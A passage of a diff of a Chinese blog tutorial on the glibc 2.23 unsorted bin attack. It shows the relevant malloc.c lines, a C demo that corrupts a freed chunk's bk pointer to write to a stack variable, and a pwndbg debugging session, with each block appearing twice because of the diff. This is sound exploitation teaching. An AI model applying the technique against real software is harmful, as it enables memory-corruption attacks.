+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#glibc-2.23/malloc/malloc.c</span><br><span class="hljs-comment">#源码第3515-3517行</span><br>		  /* remove <span class="hljs-keyword">from</span> unsorted <span class="hljs-built_in">list</span> */<br>          unsorted_chunks (av)-&gt;bk = bck;<br>          bck-&gt;fd = unsorted_chunks (av);<br>//unsorted_chunks(av)其实是&amp;main_arena.top<br></code></pre></td></tr></tbody></table></figure></div>
 
 <p>换而言之，如果我们控制了bk的值，我们就能将unsorted_chunk(av)写到任意地址。</p>
 <h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><p>接下来我们使用一个demo来演示unsortedbin_attack的原理：</p>
 <blockquote>
-<p>来源：<a target="_blank" rel="noopener" href="https://www.yuque.com/hxfqg9/bin/tubv6q">https://www.yuque.com/hxfqg9/bin/tubv6q</a><br>感谢@yichen师傅的汉化<br>这个程序的目标是通过unsortedbin_attack将stack_var改成一个很大的值。</p>
+<p>来源：<a class="link"  target="_blank" rel="noopener"  href="https://www.yuque.com/hxfqg9/bin/tubv6q" >https://www.yuque.com/hxfqg9/bin/tubv6q<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>感谢@yichen师傅的汉化<br>这个程序的目标是通过unsortedbin_attack将stack_var改成一个很大的值。</p>
 </blockquote>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"unsorted bin attack 实现了把一个超级大的数（unsorted bin 的地址）写到一个地方\n"</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备\n\n"</span>);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var=<span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"我们准备把这个地方 %p 的值 %ld 更改为一个很大的数\n\n"</span>, &amp;stack_var, stack_var);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"一开始先申请一个比较正常的 chunk: %p\n"</span>,p);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"再分配一个避免与 top chunk 合并\n\n"</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">500</span>);<br><br>    <span class="hljs-built_in">free</span>(p);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"当我们释放掉第一个 chunk 之后他会被放到 unsorted bin 中，同时它的 bk 指针为 %p\n"</span>,(<span class="hljs-type">void</span>*)p[<span class="hljs-number">1</span>]);<br><br>    p[<span class="hljs-number">1</span>]=(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var<span class="hljs-number">-2</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"现在假设有个漏洞，可以让我们修改 free 了的 chunk 的 bk 指针\n"</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"我们把目标地址（想要改为超大值的那个地方）减去 0x10 写到 bk 指针:%p\n\n"</span>,(<span class="hljs-type">void</span>*)p[<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"再去 malloc 的时候可以发现那里的值已经改变为 unsorted bin 的地址\n"</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"%p: %p\n"</span>, &amp;stack_var, (<span class="hljs-type">void</span>*)stack_var);<br>&#125;<br></code></pre></td></tr></tbody></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"unsorted bin attack 实现了把一个超级大的数（unsorted bin 的地址）写到一个地方\n"</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备\n\n"</span>);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var=<span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"我们准备把这个地方 %p 的值 %ld 更改为一个很大的数\n\n"</span>, &amp;stack_var, stack_var);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"一开始先申请一个比较正常的 chunk: %p\n"</span>,p);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"再分配一个避免与 top chunk 合并\n\n"</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">500</span>);<br><br>    <span class="hljs-built_in">free</span>(p);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"当我们释放掉第一个 chunk 之后他会被放到 unsorted bin 中，同时它的 bk 指针为 %p\n"</span>,(<span class="hljs-type">void</span>*)p[<span class="hljs-number">1</span>]);<br><br>    p[<span class="hljs-number">1</span>]=(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var<span class="hljs-number">-2</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"现在假设有个漏洞，可以让我们修改 free 了的 chunk 的 bk 指针\n"</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"我们把目标地址（想要改为超大值的那个地方）减去 0x10 写到 bk 指针:%p\n\n"</span>,(<span class="hljs-type">void</span>*)p[<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"再去 malloc 的时候可以发现那里的值已经改变为 unsorted bin 的地址\n"</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"%p: %p\n"</span>, &amp;stack_var, (<span class="hljs-type">void</span>*)stack_var);<br>&#125;<br></code></pre></td></tr></tbody></table></figure></div>
 
 <p>大致看一下流程，然后开始进行调试。</p>
 <blockquote>
 <p>编译命令：gcc -g demo.c -o demo</p>
 </blockquote>
 <h3 id="开始调试"><a href="#开始调试" class="headerlink" title="开始调试"></a>开始调试</h3><p>首先对代码的第12行下断点，开始调试程序：</p>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs c">ubuntu@ubuntu:~/Desktop/unsortedbin_demo$ gdb demo<br>GNU <span class="hljs-title function_">gdb</span> <span class="hljs-params">(Ubuntu <span class="hljs-number">7.11</span><span class="hljs-number">.1</span><span class="hljs-number">-0u</span>buntu1~<span class="hljs-number">16.5</span>)</span> 7.11.1<br><span class="hljs-title function_">Copyright</span> <span class="hljs-params">(C)</span> 2016 Free Software Foundation, Inc.<br>License GPLv3+: GNU GPL version 3 or later &lt;http:<span class="hljs-comment">//gnu.org/licenses/gpl.html&gt;</span><br>This is <span class="hljs-built_in">free</span> software: you are <span class="hljs-built_in">free</span> to change and redistribute it.<br>There is NO WARRANTY, to the extent permitted by law.  Type "show copying"<br>and "show warranty" <span class="hljs-keyword">for</span> details.<br>This GDB was configured as "x86_64-linux-gnu".<br>Type "show configuration" <span class="hljs-keyword">for</span> configuration details.<br>For bug reporting instructions, please see:<br>&lt;http:<span class="hljs-comment">//www.gnu.org/software/gdb/bugs/&gt;.</span><br>Find the GDB manual and other documentation resources online at:<br>&lt;http:<span class="hljs-comment">//www.gnu.org/software/gdb/documentation/&gt;.</span><br>For help, type "help".<br>Type "apropos word" to search <span class="hljs-keyword">for</span> commands related to "word"...<br>pwndbg: loaded 192 commands. Type pwndbg [filter] <span class="hljs-keyword">for</span> a <span class="hljs-built_in">list</span>.<br>pwndbg: created $rebase, $ida gdb <span class="hljs-title function_">functions</span> <span class="hljs-params">(can be used with print/<span class="hljs-keyword">break</span>)</span><br>Reading symbols from demo...done.<br>pwndbg&gt; b 12<br>Breakpoint 1 at 0x400722: file demo.c, line 12.<br>pwndbg&gt; r<br>Starting program: /home/ubuntu/Desktop/unsortedbin_demo/demo <br>unsorted bin attack 实现了把一个超级大的数（unsorted bin 的地址）写到一个地方<br>实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备<br><br>我们准备把这个地方 0x7fffffffdd78 的值 0 更改为一个很大的数<br><br><br>Breakpoint 1, <span class="hljs-title function_">main</span> <span class="hljs-params">()</span> at demo.c:12<br>12	    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span>);<br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────<br> RAX  <span class="hljs-number">0x51</span><br> RBX  <span class="hljs-number">0x0</span><br> RCX  <span class="hljs-number">0x7ffff7b04380</span> (__write_nocancel+<span class="hljs-number">7</span>) ◂— cmp    rax, <span class="hljs-number">-0xfff</span><br> RDX  <span class="hljs-number">0x7ffff7dd3770</span> (_IO_stdfile_2_lock) ◂— <span class="hljs-number">0x0</span><br> RDI  <span class="hljs-number">0x2</span><br> RSI  <span class="hljs-number">0x7fffffffb6e0</span> ◂— <span class="hljs-number">0x87e5acbbe49188e6</span><br> R8   <span class="hljs-number">0x7ffff7fda700</span> ◂— <span class="hljs-number">0x7ffff7fda700</span><br> R9   <span class="hljs-number">0x51</span><br> R10  <span class="hljs-number">0x0</span><br> R11  <span class="hljs-number">0x246</span><br> R12  <span class="hljs-number">0x4005b0</span> (_start) ◂— xor    ebp, ebp<br> R13  <span class="hljs-number">0x7fffffffde70</span> ◂— <span class="hljs-number">0x1</span><br> R14  <span class="hljs-number">0x0</span><br> R15  <span class="hljs-number">0x0</span><br> RBP  <span class="hljs-number">0x7fffffffdd90</span> —▸ <span class="hljs-number">0x400870</span> (__libc_csu_init) ◂— push   r15<br> RSP  <span class="hljs-number">0x7fffffffdd70</span> —▸ <span class="hljs-number">0x400870</span> (__libc_csu_init) ◂— push   r15<br> RIP  <span class="hljs-number">0x400722</span> (main+<span class="hljs-number">124</span>) ◂— mov    edi, <span class="hljs-number">0x410</span><br>─────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────<br> ► <span class="hljs-number">0x400722</span> &lt;main+<span class="hljs-number">124</span>&gt;    mov    edi, <span class="hljs-number">0x410</span><br>   <span class="hljs-number">0x400727</span> &lt;main+<span class="hljs-number">129</span>&gt;    call   <span class="hljs-built_in">malloc</span>@plt &lt;<span class="hljs-built_in">malloc</span>@plt&gt;<br> <br>   <span class="hljs-number">0x40072c</span> &lt;main+<span class="hljs-number">134</span>&gt;    mov    qword ptr [rbp - <span class="hljs-number">0x10</span>], rax<br>   <span class="hljs-number">0x400730</span> &lt;main+<span class="hljs-number">138</span>&gt;    mov    rax, qword ptr [rip + <span class="hljs-number">0x200929</span>] &lt;<span class="hljs-number">0x601060</span>&gt;<br>   <span class="hljs-number">0x400737</span> &lt;main+<span class="hljs-number">145</span>&gt;    mov    rdx, qword ptr [rbp - <span class="hljs-number">0x10</span>]<br>   <span class="hljs-number">0x40073b</span> &lt;main+<span class="hljs-number">149</span>&gt;    mov    esi, <span class="hljs-number">0x400a18</span><br>   <span class="hljs-number">0x400740</span> &lt;main+<span class="hljs-number">154</span>&gt;    mov    rdi, rax<br>   <span class="hljs-number">0x400743</span> &lt;main+<span class="hljs-number">157</span>&gt;    mov    eax, <span class="hljs-number">0</span><br>   <span class="hljs-number">0x400748</span> &lt;main+<span class="hljs-number">162</span>&gt;    call   <span class="hljs-built_in">fprintf</span>@plt &lt;<span class="hljs-built_in">fprintf</span>@plt&gt;<br> <br>   <span class="hljs-number">0x40074d</span> &lt;main+<span class="hljs-number">167</span>&gt;    mov    rax, qword ptr [rip + <span class="hljs-number">0x20090c</span>] &lt;<span class="hljs-number">0x601060</span>&gt;<br>   <span class="hljs-number">0x400754</span> &lt;main+<span class="hljs-number">174</span>&gt;    mov    rcx, rax<br>──────────────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────────────<br>In file: /home/ubuntu/Desktop/unsortedbin_demo/demo.c<br>    <span class="hljs-number">7</span>     <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备\n\n"</span>);<br>    <span class="hljs-number">8</span> <br>    <span class="hljs-number">9</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var=<span class="hljs-number">0</span>;<br>   <span class="hljs-number">10</span>     <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"我们准备把这个地方 %p 的值 %ld 更改为一个很大的数\n\n"</span>, &amp;stack_var, stack_var);<br>   <span class="hljs-number">11</span> <br> ► <span class="hljs-number">12</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span>);<br>   <span class="hljs-number">13</span>     <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"一开始先申请一个比较正常的 chunk: %p\n"</span>,p);<br>   <span class="hljs-number">14</span>     <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"再分配一个避免与 top chunk 合并\n\n"</span>);<br>   <span class="hljs-number">15</span>     <span class="hljs-built_in">malloc</span>(<span class="hljs-number">500</span>);<br>   <span class="hljs-number">16</span> <br>   <span class="hljs-number">17</span>     <span class="hljs-built_in">free</span>(p);<br>──────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────<br><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>│ rsp  <span class="hljs-number">0x7fffffffdd70</span> —▸ <span class="hljs-number">0x400870</span> (__libc_csu_init) ◂— push   r15<br><span class="hljs-number">01</span>:<span class="hljs-number">0008</span>│      <span class="hljs-number">0x7fffffffdd78</span> ◂— <span class="hljs-number">0x0</span><br><span class="hljs-number">02</span>:<span class="hljs-number">0010</span>│      <span class="hljs-number">0x7fffffffdd80</span> —▸ <span class="hljs-number">0x7fffffffde70</span> ◂— <span class="hljs-number">0x1</span><br><span class="hljs-number">03</span>:<span class="hljs-number">0018</span>│      <span class="hljs-number">0x7fffffffdd88</span> ◂— <span class="hljs-number">0xbfb16d8983641800</span><br><span class="hljs-number">04</span>:<span class="hljs-number">0020</span>│ rbp  <span class="hljs-number">0x7fffffffdd90</span> —▸ <span class="hljs-number">0x400870</span> (__libc_csu_init) ◂— push   r15<br><span class="hljs-number">05</span>:<span class="hljs-number">0028</span>│      <span class="hljs-number">0x7fffffffdd98</span> —▸ <span class="hljs-number">0x7ffff7a2d840</span> (__libc_start_main+<span class="hljs-number">240</span>) ◂— mov    edi, eax<br><span class="hljs-number">06</span>:<span class="hljs-number">0030</span>│      <span class="hljs-number">0x7fffffffdda0</span> ◂— <span class="hljs-number">0x1</span><br><span class="hljs-number">07</span>:<span class="hljs-number">0038</span>│      <span class="hljs-number">0x7fffffffdda8</span> —▸ <span class="hljs-number">0x7fffffffde78</span> —▸ <span class="hljs-number">0x7fffffffe20d</span> ◂— <span class="hljs-string">'/home/ubuntu/Desktop/unsortedbin_demo/demo'</span><br>────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────<br> ► f <span class="hljs-number">0</span>           <span class="hljs-number">400722</span> main+<span class="hljs-number">124</span><br>   f <span class="hljs-number">1</span>     <span class="hljs-number">7f</span>fff7a2d840 __libc_start_main+<span class="hljs-number">240</span><br>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────<br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs c">ubuntu@ubuntu:~/Desktop/unsortedbin_demo$ gdb demo<br>GNU <span class="hljs-title function_">gdb</span> <span class="hljs-params">(Ubuntu <span class="hljs-number">7.11</span><span class="hljs-number">.1</span><span class="hljs-number">-0u</span>buntu1~<span class="hljs-number">16.5</span>)</span> 7.11.1<br><span class="hljs-title function_">Copyright</span> <span class="hljs-params">(C)</span> 2016 Free Software Foundation, Inc.<br>License GPLv3+: GNU GPL version 3 or later &lt;http:<span class="hljs-comment">//gnu.org/licenses/gpl.html&gt;</span><br>This is <span class="hljs-built_in">free</span> software: you are <span class="hljs-built_in">free</span> to change and redistribute it.<br>There is NO WARRANTY, to the extent permitted by law.  Type "show copying"<br>and "show warranty" <span class="hljs-keyword">for</span> details.<br>This GDB was configured as "x86_64-linux-gnu".<br>Type "show configuration" <span class="hljs-keyword">for</span> configuration details.<br>For bug reporting instructions, please see:<br>&lt;http:<span class="hljs-comment">//www.gnu.org/software/gdb/bugs/&gt;.</span><br>Find the GDB manual and other documentation resources online at:<br>&lt;http:<span class="hljs-comment">//www.gnu.org/software/gdb/documentation/&gt;.</span><br>For help, type "help".<br>Type "apropos word" to search <span class="hljs-keyword">for</span> commands related to "word"...<br>pwndbg: loaded 192 commands. Type pwndbg [filter] <span class="hljs-keyword">for</span> a <span class="hljs-built_in">list</span>.<br>pwndbg: created $rebase, $ida gdb <span class="hljs-title function_">functions</span> <span class="hljs-params">(can be used with print/<span class="hljs-keyword">break</span>)</span><br>Reading symbols from demo...done.<br>pwndbg&gt; b 12<br>Breakpoint 1 at 0x400722: file demo.c, line 12.<br>pwndbg&gt; r<br>Starting program: /home/ubuntu/Desktop/unsortedbin_demo/demo <br>unsorted bin attack 实现了把一个超级大的数（unsorted bin 的地址）写到一个地方<br>实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备<br><br>我们准备把这个地方 0x7fffffffdd78 的值 0 更改为一个很大的数<br><br><br>Breakpoint 1, <span class="hljs-title function_">main</span> <span class="hljs-params">()</span> at demo.c:12<br>12	    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span>);<br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────<br> RAX  <span class="hljs-number">0x51</span><br> RBX  <span class="hljs-number">0x0</span><br> RCX  <span class="hljs-number">0x7ffff7b04380</span> (__write_nocancel+<span class="hljs-number">7</span>) ◂— cmp    rax, <span class="hljs-number">-0xfff</span><br> RDX  <span class="hljs-number">0x7ffff7dd3770</span> (_IO_stdfile_2_lock) ◂— <span class="hljs-number">0x0</span><br> RDI  <span class="hljs-number">0x2</span><br> RSI  <span class="hljs-number">0x7fffffffb6e0</span> ◂— <span class="hljs-number">0x87e5acbbe49188e6</span><br> R8   <span class="hljs-number">0x7ffff7fda700</span> ◂— <span class="hljs-number">0x7ffff7fda700</span><br> R9   <span class="hljs-number">0x51</span><br> R10  <span class="hljs-number">0x0</span><br> R11  <span class="hljs-number">0x246</span><br> R12  <span class="hljs-number">0x4005b0</span> (_start) ◂— xor    ebp, ebp<br> R13  <span class="hljs-number">0x7fffffffde70</span> ◂— <span class="hljs-number">0x1</span><br> R14  <span class="hljs-number">0x0</span><br> R15  <span class="hljs-number">0x0</span><br> RBP  <span class="hljs-number">0x7fffffffdd90</span> —▸ <span class="hljs-number">0x400870</span> (__libc_csu_init) ◂— push   r15<br> RSP  <span class="hljs-number">0x7fffffffdd70</span> —▸ <span class="hljs-number">0x400870</span> (__libc_csu_init) ◂— push   r15<br> RIP  <span class="hljs-number">0x400722</span> (main+<span class="hljs-number">124</span>) ◂— mov    edi, <span class="hljs-number">0x410</span><br>─────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────<br> ► <span class="hljs-number">0x400722</span> &lt;main+<span class="hljs-number">124</span>&gt;    mov    edi, <span class="hljs-number">0x410</span><br>   <span class="hljs-number">0x400727</span> &lt;main+<span class="hljs-number">129</span>&gt;    call   <span class="hljs-built_in">malloc</span>@plt &lt;<span class="hljs-built_in">malloc</span>@plt&gt;<br> <br>   <span class="hljs-number">0x40072c</span> &lt;main+<span class="hljs-number">134</span>&gt;    mov    qword ptr [rbp - <span class="hljs-number">0x10</span>], rax<br>   <span class="hljs-number">0x400730</span> &lt;main+<span class="hljs-number">138</span>&gt;    mov    rax, qword ptr [rip + <span class="hljs-number">0x200929</span>] &lt;<span class="hljs-number">0x601060</span>&gt;<br>   <span class="hljs-number">0x400737</span> &lt;main+<span class="hljs-number">145</span>&gt;    mov    rdx, qword ptr [rbp - <span class="hljs-number">0x10</span>]<br>   <span class="hljs-number">0x40073b</span> &lt;main+<span class="hljs-number">149</span>&gt;    mov    esi, <span class="hljs-number">0x400a18</span><br>   <span class="hljs-number">0x400740</span> &lt;main+<span class="hljs-number">154</span>&gt;    mov    rdi, rax<br>   <span class="hljs-number">0x400743</span> &lt;main+<span class="hljs-number">157</span>&gt;    mov    eax, <span class="hljs-number">0</span><br>   <span class="hljs-number">0x400748</span> &lt;main+<span class="hljs-number">162</span>&gt;    call   <span class="hljs-built_in">fprintf</span>@plt &lt;<span class="hljs-built_in">fprintf</span>@plt&gt;<br> <br>   <span class="hljs-number">0x40074d</span> &lt;main+<span class="hljs-number">167</span>&gt;    mov    rax, qword ptr [rip + <span class="hljs-number">0x20090c</span>] &lt;<span class="hljs-number">0x601060</span>&gt;<br>   <span class="hljs-number">0x400754</span> &lt;main+<span class="hljs-number">174</span>&gt;    mov    rcx, rax<br>──────────────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────────────<br>In file: /home/ubuntu/Desktop/unsortedbin_demo/demo.c<br>    <span class="hljs-number">7</span>     <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备\n\n"</span>);<br>    <span class="hljs-number">8</span> <br>    <span class="hljs-number">9</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var=<span class="hljs-number">0</span>;<br>   <span class="hljs-number">10</span>     <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"我们准备把这个地方 %p 的值 %ld 更改为一个很大的数\n\n"</span>, &amp;stack_var, stack_var);<br>   <span class="hljs-number">11</span> <br> ► <span class="hljs-number">12</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p=<span class="hljs-built_in">malloc</span>(<span 